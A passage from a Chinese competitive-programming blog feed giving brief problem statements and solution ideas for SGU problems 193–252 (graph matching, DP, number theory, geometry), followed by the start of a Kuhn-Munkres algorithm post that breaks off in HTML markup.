Girls’ Amusement</strong></p><p><strong>题意</strong>  有 $3\le N\le 10^{2000}$ 玩丢手绢游戏，手持手绢的人将手绢传递给顺时针方向的第 $1\le K\le \lfloor\frac N2\rfloor$ 个人，当手绢丢回第一个人时游戏结束。要求游戏过程中每个人都要拿过手绢，求最大满足要求的 $K$ 值。 </p><p><strong>分析</strong> 假设经过 $p$ 次传回第一个人，那么有 $pK \mod N = 0$，而要求每个人都要拿过手绢，因此 $p=N$，也就是说 $NK = lcm(K, N)$，等价于 $\gcd (K, N) = 1$ 即 $K$ 和 $N$ 互质。</p><p>假设 $N= 2n+1$，当 $K=\lfloor\frac N2\rfloor=n$ 时，$\gcd (K, N)=\gcd(n, 2n+1)=\gcd(n, n+1)=1$。所以当 $N$ 是奇数时，能取到上限 $\lfloor\frac N2\rfloor$。</p><p>当 $N=2n$ 时，若 $K = \lfloor\frac N2\rfloor=n$，则 $\gcd(K, N) = \gcd(n, 2n) = n &gt; 1$； 若 $K=n-1$，则 $\gcd(K, N)=\gcd(n-1, 2n)=\gcd(n-1, 2)$，当 $n$ 是偶数时，gcd = 1；若 $K=n-2$，则 $\gcd(K, N)=\gcd(n-2, 2n)=\gcd(n-2, 4)$，当 $n$ 是奇数时，gcd = 1。</p><p>综上，$K$ 的取值仅三种情况，分类讨论即可。</p><p>PS：上述结论可通过小数据打表辅助观察得到。</p><hr><p>194 <strong>Reactor Cooling</strong></p><p><strong>题意</strong>  。</p><p><strong>分析</strong> 无源汇上下界最大流。</p><hr><p>195 <strong>New Year Bonus Grant</strong></p><p><strong>题意</strong>  有 $2\le N\le 5×10^5$ 名员工，每名员工有<strong>唯一</strong>上级（即上下级关系构成一棵树）。每名员工可以分配拨款给其中一名下属，或接受来自上级的拨款，但是不能同时分配和接受拨款。求拨款总和可能的最大值。</p><p><strong>分析</strong> 树形 dp，每名员工根据是否分配了拨款划分成两个状态，分别记录最大拨款值即可。</p><hr><p>196 <strong>Matrix Multiplication</strong></p><p><strong>题意</strong>  。</p><p><strong>分析</strong> 模拟。</p><hr><p>197 <strong>Nice Patterns Strike Back</strong></p><p><strong>题意</strong>  对长 $1\le N\le 10^{100}$ 宽 $1\le M\le 5$ 的矩形黑白染色，要求任意 2×2 的子矩形不能完全同色（即 4 白色或 4 黑色）。求合理的方案数，结果对 $1\le P\le 10000$  取模。</p><p><strong>分析</strong> 按行染色，显然就是矩阵 + 快速幂，对于 $N$ 的处理需要大数或者手动模拟整数除法。</p><hr><p>198 <strong>Get Out!</strong></p><p><strong>题意</strong>  给平面上 $1\le N\le 300$ 个圆 $(x_i, y_i, r_i)$ 表示岛屿，一个圆 $(X, Y,R)$ 表示船。判断这艘船能否自由航行，即不被岛屿与岛屿之间的缝隙卡住而无法走出群岛区域。</p><p><strong>分析</strong> 将每个岛屿的半径增加 $R$，当两个新圆相交（不包括相切）时，船只无法通过这两个岛屿之间的缝隙。<del>剩下的问题转化为判断一个点是否被多边形包围。</del></p><hr><p>199 <strong>Beautiful People</strong></p><p><strong>题意</strong>  一个俱乐部中有 $2\le N\le 10^5$ 个人，每个人有能力值 $1\le S_i\le 10^9$ 和魅力值 $1\le B_i\le 10^9$。现想邀请尽可能多的人参加派对，但是当 $S_i\le S_j\and B_i\ge B_j$ 时两个人存在矛盾。在不邀请有矛盾的两个人来派对的前提下，问最多能邀请多少人。</p><p><strong>分析</strong> 按 $pair(S_i, B_i)$ 排序，问题转变成最长上升子序列。</p><hr><p>200 <strong>Cracking RSA</strong></p><p><strong>题意</strong>  给 $1\le m\le 100$ 个数 $1\le b_i\le 10^9$，所有数的质因子是前 $1\le t\le 100$ 个质数。求 {1, 2, …, m} 的所有子集数量，子集所对应 $\prod b_i$ 是完全平方数。</p><p><strong>分析</strong> $\prod b_i$ 是完全平方数，说明每个质因子的指数都是偶数，那么我们只关心 $b_i$ 每个质因子的指数奇偶性，本质上就是解模 2 意义下的方程组解的数量（套高斯消元板子即可）。 </p><hr><p>201 <strong>Non Absorbing DFA</strong></p><p><strong>题意</strong>  给一个 $1\le K\le 1000$ 个状态的有限状态自动机，字符集为小写字母。除了常规的状态转移外，还有转移 $X(u, c) $：当 $X(u, c)=0$ 时正常转移；当 $X(u, c)=1$ 时不进行匹配，但是可以进入相应的状态（可以认为是等价状态的转移）。求长度为 $1\le N\le 60$ 的所有字符串中被该自动机接受的字符串数量。</p><p><strong>分析</strong> 大数模拟。</p><hr><p>202 <strong>The Towers of Hanoi Revisited</strong></p><p><strong>题意</strong>  $4\le M\le 65$ 塔汉诺塔问题，将 $1\le N\le 64$ 圆盘从第一柱塔移动到第 $M$ 柱塔上，求最少的操作次数以及具体的移动方案。</p><p><strong>分析</strong> 三塔汉诺塔推广，先将 $N-1$ 个圆盘均摊到其他塔上，将第 $N$ 个圆盘直接移动到目标塔上，然后重复操作将 $N-1$ 个圆盘依次移动到目标塔上。</p><hr><p>203 <strong>Hyperhuffman</strong></p><p><strong>题意</strong> 给 $2\le N\le 5×10^5$ 个字符在某一字符串的出现次数 $1\le P_i\le 10^9, P_i\le P_{i+1}$，使用哈夫曼编码字符，求编码后的字符串长度。</p><p><strong>分析</strong> 由于 $P_i$ 本身有序，因此对于合并得到的 $P_i+P_j$ 可由队列维护（该队列天然也是有序的），因此总的时间复杂度是 $O(N)$。</p><hr><p>204 <strong>Little Jumper</strong></p><p><strong>题意</strong> </p><p><strong>分析</strong></p><hr><p>205 <strong>Quantization Problem</strong></p><p><strong>题意</strong> 给 $m×s,1\le m\le s\le 128$ 编码表 $A_{ij}$，需要编码 $1\le n\le 1000$ 个数 $1\le x_i\le 10^6$，规则：假设第 $i$ 个数使用了第 $k_i$ 列，则第 $i+1$ 个数只能使用第 $k_i\mod m$ 行的数来编码。求 $\sum|x_i-A_{k_{i-1}\mod m, k_i}|$ 的最小值。</p><p><strong>分析</strong> $dp(i, j)$ 表示第 $i$ 个数使用第 $j=k_i\mod m$ 列编码的最小值。</p><hr><p>206</p><hr><p>207</p><hr><p>208 <strong>Toral Tickets</strong></p><p><strong>题意</strong> 给 $N\times M, 1\le N, M\le 20$ 大小的橡胶板，按长边卷成圆柱体（底面周长为短边），然后再将圆柱体卷成环状（类似泳圈），每个格子可染色黑/白，求<strong>本质不同</strong>的环状物。当橡胶板为正方形时，有两种方案卷成圆柱体。 </p><p><strong>分析</strong> 当其中一条边为 1 时，本质上是<strong>项链染色</strong>问题。在本题背景下，仅需要多考虑一个方向上的旋转，但是不方便直接计算每个置换的循环数（polya 计数）。本题矩形大小较小，因此可以模拟计算每个置换的循环数。</p><p><strong>标签</strong> Polya</p><hr><p>209 <strong>Areas</strong></p><p><strong>题意</strong> 给平面上 $1\le N\le 80$ 条直线，这些直线会划分出有限面积和无线面积的区域，求有限面积的各个区域的面积。</p><p><strong>分析</strong> （未代码验证）直线交求出交点坐标，处理出各个交点的相邻交点。有限面积区域都是凸包，利用这个性质可以处理所有的有限面积区域。判重可以利用连续 3 个点 index 来区分。</p><p><strong>TAG</strong> Geometry</p><hr><p>210 <strong>Beloved Sons</strong></p><p><strong>题意</strong> 有 $1\le N\le 400$ 个男生匹配 $1\le M\le 1000$ 个女生，每个男生有 $K_i$ 个喜欢的女生。当男生和其喜欢的女生配对时，产生价值 $1\le A_i \le 1000$，否则无价值。求最大的 $\sqrt{\sum A_i^2}$。</p><p><strong>分析</strong> KM 算法。</p><p><strong>TAG</strong> KM   </p><hr><p>211 <strong>Strange Counter</strong></p><p><strong>题意</strong> 实现特殊二进制的累加器，特殊处在于每位能存 [0, 2] 之间的 3 个数。进行 $1\le M\le 10^4$ 次操作，每次加上 $2^{x_i}，0\le x_i\lt N, N\le 10^3$，并要求每次修改的位数不能超过 4。数据保证总和小于 $2^{N}$。</p><p><strong>分析</strong> （未代码验证）模拟，过程中如果发生连续进位，在修改位数超过 4 时，不再进位。当加法没有发生进位时，在处理之前的遗留进位。</p><hr><p>212 <strong>Data Transmission</strong></p><p><strong>题意</strong> </p><p><strong>分析</strong></p><p><strong>TAG</strong> Network-flow</p><hr><p>213 <strong>Strong Defence</strong></p><p><strong>题意</strong> 给 $2\le N\le 400$ 个点的无向图以及起点 $S$ 和终点 $T$。将边集划分成若干不相交的集合，使得去掉任意集合后 $S, T$ 不联通。求最大集合数量。 </p><p><strong>分析</strong></p><hr><p>214 <strong>Weird Dissimilarity</strong></p><p><strong>题意</strong> 给 200 大小的字符集 $\sum$ ，字符 $c_1, c_2$ 的距离给定为 $d(c_1, c_2)$。现给出长度不超过 2000 的字符串 $s_1, s_2$，要求找出两个<strong>等长</strong>的字符串 $\alpha,\beta$，满足：$s_1$ 是 $\alpha$ 的<strong>子序列</strong>，$s_2$ 是 $\beta$ 的子序列，且 </p><script type="math/tex; mode=display">\sum_{i=1}^{|\alpha|} d(\alpha_i,\beta_i)</script><p>最小。</p><p><strong>分析</strong> 最长公共子序列。</p><hr><p>215 <strong>PL/Cool</strong></p><p><strong>题意</strong> 表达式解析以及计算。</p><p><strong>分析</strong></p><hr><p>216 <strong>Royal Federation</strong></p><p><strong>题意</strong> 给 $1\le N\le 10^4$ 大小的树以及常数 $1\le B\le N$，要求将树分割成若干大小介于 $[B, 3B]$ 的区域，每个区域不一定联通但需要存在一个控制点连接该区域的点，找出一个可行方案。</p><p><strong>分析</strong> （理论）不断将树的大小二分，即找重心。</p><hr><p>217 <strong>Two Cylinders</strong></p><p><strong>题意</strong> 给三维空间中无限长的两个圆柱体，半径分别为 $1\le R_1, R_2\le 100$，其轴线相互垂直，求交区域面积。</p><p><strong>分析</strong> </p><hr><p>218 <strong>Unstable Systems</strong></p><p><strong>题意</strong> 有 $N$ 台工作站和 $N$ 个程序，工作站 $i$ 运行程序 $j$ 出错的不稳定性为 $|a_{i, j}|\le 10^6$。在一台工作站运行一个程序的前提下，求解一个分配方案最小化不稳定性的最大值。</p><p><strong>分析</strong> （理论）二分最大值，求解二分图的最大匹配。</p><hr><p>219 <strong>Synchrograph</strong></p><p><strong>题意</strong> 给 $1\le N\le 1000$ 个点, $1\le M\le 50000$ 条边的有向图，边权是不超过 $10^9$ 的非负整数。当一个点的所有入边边权均为正数时，视为激活状态并且可以将所有入边边权减一，所有出边边权加一。现要求判断每个点是否能经过若干操作后变成激活状态。</p><p><strong>分析</strong> （理论）<del>考虑最简单的情况，相邻两个点存在双向边且边权均为 0，那么这 2 个点都不可能变成激活状态。</del></p><hr><p>220 <strong>Little Bishops</strong></p><p><strong>题意 </strong> 给大小为 $n\times n, 1\le n\le 10$ 的国际象棋棋盘，放置 $0\le k\le n^2$ 个象。象只能沿对角线方向走，步数不限但会互相攻击路径上的其它象。求放置后不会互相攻击的方案数。 </p><p><strong>分析</strong> dp。</p><hr><p>221 <strong>Big Bishops</strong></p><p><strong>题意</strong> （与 220 Little Bishops 相同），棋盘大小为 $n\times n, 1\le n\le 50$，求方案数。</p><p><strong>分析</strong></p><hr><p>222 <strong>Little Rooks</strong></p><p><strong>题意</strong></p><p><strong>分析</strong></p><hr><p>223 <strong>Little Kings</strong></p><p><strong>题意</strong> 在 $n\times n, 1\le n\le 10$ 的棋盘上放置国王，国王会攻击相邻的 8 个格子。求放置 $k$ 个国王且不互相攻击的方案数。</p><p><strong>分析</strong> 状压 dp。</p><hr><p>224 <strong>Little Queens</strong></p><p><strong>题意</strong></p><p><strong>分析</strong></p><hr><p>225 <strong>Little Knights</strong></p><p><strong>题意</strong></p><p><strong>分析</strong></p><hr><p>226 <strong>Colored graph</strong></p><p><strong>题意</strong> $2\le N\le 200$ 个点，$0\le M\le N^2$ 条边的有向图，每条边为三种颜色中的一种。求点 1 到点 N 的最短距离，要求路径上不能出现连续相同颜色的边。</p><p><strong>分析</strong> 最短路</p><hr><p>227 <strong>The art to the broad masses!</strong></p><p><strong>题意</strong> 给 $1\le N\le 50$ 个半圆弧，判断交点数量是否有限，若有限输出所有交点。</p><p><strong>分析</strong> 本质上求解两圆交点，然后仅保留半圆上的点（可以利用叉积计算）。</p><hr><p>228 <strong>Archipelago</strong></p><p><strong>题意</strong> 已知正 $3\le N\le 150$ 边形的两个点，按顺时针方向标号，第 $N_1$ 个点的坐标为 $(x_1, y_1)$，第 $N_2$ 个点的坐标为 $(x_2, y_2)$。求正 $N$ 边形的所有顶点坐标，按标号顺序输出。</p><p><strong>分析</strong> 计算几何。</p><hr><p>229 <strong>Divide and conquer</strong></p><p><strong>题意</strong></p><p><strong>分析</strong></p><hr><p>230 <strong>Weighings</strong></p><p><strong>题意</strong> 有 $1\le N\le 100$ 个硬币，第 $i$ 个硬币重量为 $i$ 克，每个硬币放入无差别的盒子中。目前已知 $1\le M\le 10000$ 个重量关系 $1\le P, Q\le N$，表示盒子 $P$ 的重量大于盒子 $Q$ 的重量。求每个硬币放入的盒子编号，输出任一种方案，若无解输出 “No solution”。</p><p><strong>分析</strong> 拓扑序。</p><hr><p>231 Prime Sum</p><p><strong>题意</strong> 求 $1\le N\le 10^6$ 范围内的质数对 $(A, B), A\le B$，满足 $A+B$ 也是质数的数量。</p><p><strong>分析</strong> 除 2 外，质数都是奇数。而奇数+奇数=偶数，因此问题转化为质数对 $(2, B)$ 的方案数。</p><hr><p>232 Infinite Fraction</p><p><strong>题意</strong> 给长为 $1\le N\le 1.5\times10^5$ 的数字串 $D, 0\le D_i\le9$ 以及常数 $0\le K\le 10^9$，构造无限循环小数 $A_i$，其中 $A_{i, j}=D_{(i+jK)\mod N}$，其中 $j\ge 0$ 表示第几个小数。在所有可能的小数 $A_i$ 中找出最大的小数。</p><p><strong>分析</strong> 每个无限循环小数的重复部分长度是一致的，因为步长 $K$ 和环长 $N$ 是固定的，并且长度为 $\frac{N}{gcd(N,K)}$，因此 $A_i$ 比较大小时仅需要比较 $\frac{N}{gcd(N,K)}$ 长即可。到这步时比较容易想到用<strong>后缀数组</strong>处理，将前 $N$ 个 $A_i$ 的重复部分拼接起来比较各个 $A_i$ 的序即可。但是这种做法空间复杂度为 $O(\frac{N^2}{gcd(N,K)})$，不适用于 $N$ 很大的情况。考虑 $A_i$ 的重复部分包含了 $A_{i+1,0}, A_{i+1,1}$ 等部分，复用这部分数据仅需要将 $A_i$ 的重复部分再复制一份即可，总共需要额外 $gcd(N, K)\frac N{gcd(N,K)}=N$ 的空间（这里 $gcd(N,K)$ 表示循环个数）。</p><hr><p>233 The Greatest Angle</p><p><strong>题意</strong> $1\le N\le 10^4$ 个测试，每次测试给一个圆 $(x_0, y_0, r)$ 以及点 $A(x_a, y_a)$，点 $B(x_b, y_b)$，在圆上找到一点 C 使得角 ACB 最大。若有多解输出任一解。</p><p><strong>分析</strong></p><hr><p>234 Black-White King Strikes Back</p><p><strong>题意</strong> 给大小为 $M\times N, 1\le M,N\le 200$ 的棋盘，需要在棋盘上放置卫兵，但是卫兵会攻击上下左右的所有生物，即包括其他卫兵。在有些格子不能放置卫兵的前提下，求最多能放置多少个卫兵使得卫兵不会互相攻击。</p><p><strong>分析</strong> 二分图的最大独立集。假设每个格子的坐标为 $(x, y)$，则根据 $x+y$ 的奇偶性可划分出 2 个点集，并且冲突仅出现在两个点集之间，点集内部没有冲突。将冲突表示成边的话，问题就转换成找出二分图的最大独立集。</p><p><strong>Konig定理</strong></p><p>假设二分图的最大匹配数为 M，最小覆盖数为 m，则有:</p><ol><li>m ≤ M。令最大匹配的点集为 C，二分图为 <v, e>。假设有 m &gt; M，所以存在点 a, b ∉ C 且 (a, b) ∈E，这与最大匹配的定义矛盾，因此假设不成立。</v,></li><li>m ≥ M。在最大匹配中，每对匹配没有公共点，因此覆盖匹配边至少需要 M 个点，因此有 m ≥ M。</li></ol><p>综上二分图有：最小覆盖数 = 最大匹配数。</p><p><strong>二分图最小点覆盖的构造方案</strong></p><p>基于二分图中最小点覆盖数等于最大匹配数的结论来构造方案，首先有两个认知：</p><ol><li>每对匹配有且仅有一个点在方案中；</li><li>没有配对且有连边的点，由有匹配的点来覆盖其之间的连边。</li></ol><p>那么根据上面的认知，则有构造方案：</p><ol><li>选取二分图左侧无匹配的所有点，根据认知 2 这些点必须由右侧在匹配中的点来覆盖（理论上，此时无匹配的左侧点也找不到无匹配的右侧点，否则就违反了最大匹配的定义）。</li><li>在选取了部分右匹配点进方案后，根据认知 1，相应的左侧匹配点就不能选择了。之后，将这些不能选择的左侧点视为无匹配点，寻找其他右匹配点来覆盖非匹配边。</li><li>在步骤 1,2 中未访问过的点，只剩匹配点之间自己的连边，可以任选一点。</li></ol><p>步骤 1,2 本质上是在寻找增广路，并且覆盖了左侧无匹配点与右侧之间的连边。在最大匹配的前提下，步骤 1,2 找不到新匹配，因此增广路的终点必然是左侧。</p><p>右侧无匹配点与左侧之间的连边情况也是类似的，仿照步骤 1,2 即可。显然，处理左侧无匹配点和右侧无匹配点不存在冲突，因此可以在一次 BFS 中处理。</p><hr><p>235 The Queen</p><p><strong>题意</strong> 在大小为 $2\le N\le 300$ 的国际象棋棋盘上，有且仅有一个白棋皇后以及其他种类的白棋和黑棋。白皇后只可以攻击黑棋，在仅有白皇后可以移动的前提下，求白皇后在 $0\le M\le 50$ 步后可以到达哪些位置。</p><p><strong>分析</strong> 模拟。</p><hr><p>236 Greedy Path</p><p><strong>题意</strong> 给 $3\le N\le 50$  个点，$M$ 条边的带权有向图，每条边有权值 $1\le C_{ij}\le 100$ 和 $1\le T_{ij}\le 100$。求一个环使得 $\sum C_{ij}/\sum T_{ij}$ 最大。</p><p><strong>分析</strong></p><hr><p>237 Galaxy X: Episode I - Masters of Mind</p><p><strong>题意</strong> 给定长度为 255 且包含 ‘*‘,’?’,’!’ 的正则表达式，基于该正则构造长度和字典序都是最小的回文串。各符号含义：’*‘ 匹配任意长度的任意字符；’?’ 恰好匹配一个字符；’!’ 恰好匹配三个字符。</p><p><strong>分析</strong> DP；’!’替换成 3 个 ‘?’。</p><hr><p>238 Uncle Vasya and Bags for Potatoes</p><p><strong>题意</strong> （将题目中的地板抽象成一个点）给一棵大小为 $N+1$ 的树，每次操作将根节点的一个儿子节点替换成根。在给定初始状态后，经过若干次操作可以得到多少种不同的状态。</p><p><strong>分析</strong> 每种状态根据只与树根编号有关，因此答案为 $N+1$（特判 $N=1$ 时答案为 1）。</p><hr><p>239 Minesweeper</p><p><strong>题意</strong> 在 $2\times N, 1\le N\le 1000$ 的扫雷游戏中，地雷只会出现在第 1 列，已知第 2 列数字的前提下，求所有可能埋雷的方案数。</p><p><strong>分析</strong> dp(i, mask)。</p><hr><p>240 Runaway</p><p><strong>题意</strong> 给 $1\le N\le 100$ 个点，$1\le M\le 10000$ 条边的无向图，每条边有初始温度 $0\le R_i\le 10000$，每秒温度增长值 $0\le P_i\le 10000$，通过该边的时间 $1\le T_i\le 10000$。角色最高能忍受的温度为 $1\le H\le 10000$，已知当前角色位置为 $S$，需要从 $E$ 个出口中离开地图，希望最小化路径中的最高温度。</p><p><strong>分析</strong> dp。</p><hr><p>241 The United Fields of Chessboardia</p><p><strong>题意</strong> 给大小分别为 $N\times N,0\le N\le 20$ 和 $M\times M, 0\le M\le 20$ 的棋盘，第 2 个棋盘的左下角与第 1 个棋盘的右上角重叠一部分。求放置 $0\le K\le 10^9$ 个车的方案数，满足任意 2 个车不互相攻击。</p><p><strong>分析</strong> 状压 dp。</p><hr><p>242 Student’s Morning</p><p><strong>题意</strong> 有 $0\le N\le 200$ 个学生以及 $0\le K\le 200$ 所学校。需要去访问所有学校，但每所学校至少需要 2 个学生，并且每个学生都有自己的学校偏好列表，求解是否存在一种方案，若有则输出一种。</p><p><strong>分析</strong> 最大流可解。</p><hr><p>243 Broken Chessboard</p><p><strong>题意</strong> 大小为 $1\le N\le 5$ 的正方形棋盘碎成若干个连通块，这些连通块散落后可能会发生翻转 90/180/270 的情况。现要求复原该正方形，输出任一方案。</p><p><strong>分析</strong> 搜索+剪枝。</p><hr><p>244 Height, Bisector and Median</p><p><strong>题意</strong> 给 △ABC 的高  AH, 角平分线 AD 以及中位线 AM（所有长度不超过 100）。判断是否能构造出 △ABC，若能输出任一方案。</p><p><strong>分析</strong></p><hr><p>245 Black-White Army</p><p><strong>题意</strong> 给大小为 $N\times M, 1\le N,M\le 300$ 的国际象棋棋盘，主角有且仅有一个棋子（可从 pawn, rook, knight, bishop 和 king 中选一类型），对手棋子散布在棋盘上不会主动移动但如果可以就会攻击主角的棋子。主角若击杀对方棋子，可根据棋子类型获得不同的分数。现给定双方棋子的位置，求主角最多能获得多少分数。</p><p><strong>分析</strong> 因为棋盘上的路径是可逆的，那么主角击杀棋子的顺序是无关的，即可贪心地击杀对方棋子。在击杀对面棋子后，一些原本不可达的位置可能就可以在不被对方攻击的情况下到达了，这个更新需要遍历整个棋盘，可以 lazy update。</p><hr><p>246 Black &amp; White</p><p><strong>题意</strong> 给长度为 $2N-1$ 长度由黑色/白色珠子构成的项链，其中有 $K$ 个黑色珠子。如果项链能找到 2 个黑色珠子将项链分成两部分且其中一部分长度为 $N$，则定义为好项链。找出最小的 $K$ 使得所有项链都是好项链。</p><p><strong>分析</strong> 记项链长度 $L=2N-1$，将问题转化成最多能放置多少个黑色珠子使得两两之间的长度不为 $N$。考虑最坏的情况，位置 $i$ 放置黑珠，位置 $i+(N+1)$ 放置白珠，位置 $i+2(N+1)$ 放置黑珠，以此类推。最后会回到位置 $i$，即 $i+k(N+1)\equiv i\pmod L$，到这步可以解出 $k=\frac{LCM(N+1,L)}{N+1}$，即在这个循环中有 $k$ 个位置，按照黑色交替染色最多可以放置 $\lfloor \frac {k} 2\rfloor$。因为项链长度为 $L$，这样的循环共有 $L/k$ 个，整个项链最多可以放置 $\lfloor\frac k 2\rfloor \frac Lk$ 个黑子珠子满足两两之间长度不为 $N$。</p><hr><p>247 Difficult Choice</p><p><strong>题意</strong> $0\le N\le 100$ 次测试，每个测试给一个奇质数 $P\lt 1000$，需要从 $[1, 2P]$ 中选取 $P$ 个数满足和是 $P$ 的倍数，求方案数。</p><p><strong>分析</strong> 将数分为集合 $A=\{x|x\in[1,P]\}$ 和集合 $B=\{x|x\in[P+1,2P]\}$。假设从 $A$ 中取 $a_1, a_2, \dots,a_n$，从 $B$ 中取 $b_1, b_2, \dots, b_m$，满足 $n+m=P$ 且 $\sum a_i +\sum b_i =kP$，则有推论：记 $c_i=(a_i-1+d)\mod P+1$，有 $\forall d\in[1,P)，\sum c_i+\sum b_i \neq kP$，即在有一组合法解的前提下可构造不出 $P-1$ 个<strong>非法解</strong>。</p><p>首先证明序列 $a_i$ 和序列 $c_i$ 不一致，使用反证法证明：$\exist d\in [1,P)$，使得 $a_i=c_j=(a_j-1+d)\mod P+1$。因为 $c_i$ 是 $a_i$ 的一个置换，可以计算出每个循环的长度为 $P/\gcd(d,P)=P$。在<strong>没有全选集合 $A$</strong> 的情况下有 $n&lt;P$，故假设不成立从而有 $a_i$ 和 $c_i$ 不一致。</p><p>因为有 $n&lt;P, d&lt;P$ 且 $P$ 是质数，所以 $nd\neq 0\pmod P$，则 $\sum c_i + \sum b_i \neq \sum a_i+\sum b_i=kP$。</p><p>综上，在所有选取方案（包括非法）中，每 $P$ 组有一组解，因此方案数为 $\frac{C(2P, P)-2}{P}+2$，常数 2 表示全选 A 和全选 B。</p><hr><p>248 Integer Linear Programming</p><p><strong>题意</strong> 整形线性规划问题，给定 $0\lt N\le 3$ 个变量 $x_i$，最小化目标函数为 $f(x_1, x_2,\dots,x_N)=\sum x_i$，约束为 $\sum c_ix_i = V$，其中 $0\lt c_i, V\le 10^6$。求解非负整数解 $(x_1, x_2,\dots, x_N)$。</p><p><strong>分析</strong> 将变量视为空间为 $c_i$ 价值为 1 的物品，问题转化成完全背包问题。</p><hr><p>249 Matrix</p><p><strong>题意</strong> 使用 $[0, 2^{N+M}), N+M\le 20$ 的所有数构造 $2^N\times 2^M$ 大小的矩阵，满足相邻格子中的数在二进制表示下仅一位不同。矩阵是环形的，即第一列和最后一列相邻，第一行和最后一行相邻。</p><p><strong>分析</strong> 将二进制位拆分成两部分，第一部分占 $N$ 位，第二部分占 $M$ 位。构造思想：同一行的数前 $N$ 位相同，通过后 $M$ 位造环；不同行的数后 $M$ 位按列一一对应，仅前 $N$ 位中有一位不同，即通过前 $N$ 位构造行之间的环。因为第一部分和第二部分是相互独立的，所以本质上是求 $2^K$ 的环构造方案。</p><p>使用数学归纳法构造方案：</p><ol><li>当 $K=2$ 时，有 00, 01, 11, 10。</li><li>当 $K&gt;2$ 时，假设 $K-1$ 的序列为 $x_1, x_2, \dots, x_{2^{K-1}}$，基于 $x_i$ 构造 $\overline {0x_i}, \overline {1x_i}$，新构造的两个数仅一位不同，并且可以构造出新序列 $\overline{0x_i}, \overline{1x_i}, \overline{1x_{i+1}}, \overline{0x_{i+1}}$。显然，新序列也是符合题意的环。</li></ol><hr><p>250 Constructive Plan</p><p><strong>题意</strong> 给 $N\times M, 1\le N,M\le 180$ 大小的 01 矩阵，求一个由全 0 构成的 C 字形最大面积。C 字形由三个矩形构成，左边界在同一列，中间矩形的宽度严格小于上下两个矩形的宽度。</p><p><strong>分析</strong> 枚举 C 字形的上下边界，处理出三个矩形的公共矩形，之后需要考虑 2 种情况。一种是不向外扩展，则在公共矩形右边界所在列中部挖一个孔，形成 C 字形。另一种是向右侧扩展，因为上下矩形两者宽度互不影响，因此只需要预处理以给定矩形左上角顶点的最大矩形和以给定矩形左下角顶点的最大矩形，然后尝试扩展形成更大的 C 字形。</p><hr><p>251 Polymania</p><p><strong>题意</strong>  已知有 $3\le N\le 8$ 个二维平面上的点，每个点有正整数权重 $0&lt;R_i\le 100$ 且 $R_{N-1}=R_N$。要求任意 3 个点构成三角形面积等于权重之和，若有解输出所有点坐标。</p><p><strong>分析</strong> 假设固定点 N-1 和点 N 这一线段长度，那么其他点距离点 N-1 和点 N 所在直线的距离便固定了，即其他点的位置根据其权重 Ri 固定在某一直线上。</p><p>假设有权重不同的点 A 和点 B，因为 $R_{N-1}=R_N$，所以 A,B 不会在线段 (N-1, N) 的同一侧，并且线段 (N-1, N) 的中点必须在线段 (A, B) 上。可以通过反证法验证，不能在添加一点 C 满足条件。因此满足题意的最多 4 个点，根据该限制构造答案即可。</p><hr><p>252 Railway Communication</p><p><strong>题意</strong> 给 $1\le N\le 100$ 个点和 $0\le M\le 1000$ 条边的有向无环图，<strong>任意两点有且仅有一条边</strong>。求解<strong>最少</strong>路径数量， 满足：每个点有且仅有一个条路径经过；每条边最多被一条路径使用。其中，路径定义为若干条连续边组成。在路径最少的前提下，最小化使用边的权值总和。 </p><p><strong>分析</strong> 最小费用最大流。将每个点拆分入点和出点，流量为 1 费用为边权。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;计划&quot;&gt;&lt;a href=&quot;#计划&quot; class=&quot;headerlink&quot; title=&quot;计划&quot;&gt;&lt;/a&gt;计划&lt;/h1&gt;&lt;p&gt;计划一年内（截止 2021 年 1 月 1 日）把 SGU 500 刷完，形式以所有题目给出翻译后的简要题意和解题思路概要。&lt;/p&gt;
&lt;p&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Kuhn-Munkres Algorithm</title>
    <link href="http://mcginn7.github.io/2020/05/10/Kuhn-Munkres-Algorithm/"/>
    <id>http://mcginn7.github.io/2020/05/10/Kuhn-Munkres-Algorithm/</id>
    <published>2020-05-10T06:17:51.000Z</published>
    <updated>2020-05-10T06:19:44.321Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>背景：带边权的二分图<strong>最大权值完美匹配</strong>。</p></li><li><p>顶标概念：顶点权值 $L_x, L_y$。</p></li><li><p>可行顶标：<strong>所有</strong>边 $e(x→y)$  ，都满足 $L_x+L_y\ge W_e$。</p><p><strong>注：</strong>此时还没有开始匹配，是对原图所有边的限制。</p></li><li><p>相等子图：包含所有顶点；仅包含 $W_{x→y}=L_x+L_y$ 的边。</p><p>问题即转化为求相等子图的完美匹配，此时边权和达到上限 $\sum L_x+ \sum L_y$。</p></li><li><p>初始化：$L_y=0, L_x=\max_{j\in Y}{W_{x→j}}$ 使得初始方案为可行顶标。</p></li><li><p>交替路：与匈牙利算法类似，在相等子图中搜索增广路时，如果找不到时我们称此时得到一条交替路。</p><p>如果将<strong>交替路</strong>中 $X$ 集合的顶标都 $-d, d&gt;0$，$Y$ 集合的顶标都 $+d$，有以下结论：</p><ul><li><p>如果 $x→y$ 在相等子图中，$L_x+L_y$ 无变化，即该边仍在相等子图中。</p></li><li><p>如果 $x→y$ 不在相等子图中，<strong>当 $x$ 在交替路而 $y$ 不在交替路时</strong>，$L_x+L_y$ 将减少 $d$，意味着该边有可能加入相等子图中。注意 $d$ 不能过大，否则会破坏<strong>可行顶标</strong>这个前提，因此</p><script type="math/tex; mode=display">d=\min\{L_x+L_y-W_{x→y}|x在交替路\and y不在交替路\}</script></li></ul><p><strong>注：</strong>相等子图中顶标之和 $\sum L_x + \sum L_y$ 越来越小，以此来加入更多的边使得边权和更大。</p></li><li><p><a href="https://github.com/McGinn7/Template-for-ICPC/blob/master/template/km.cpp" target="_blank" rel="noopener">代码模板</a></p></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 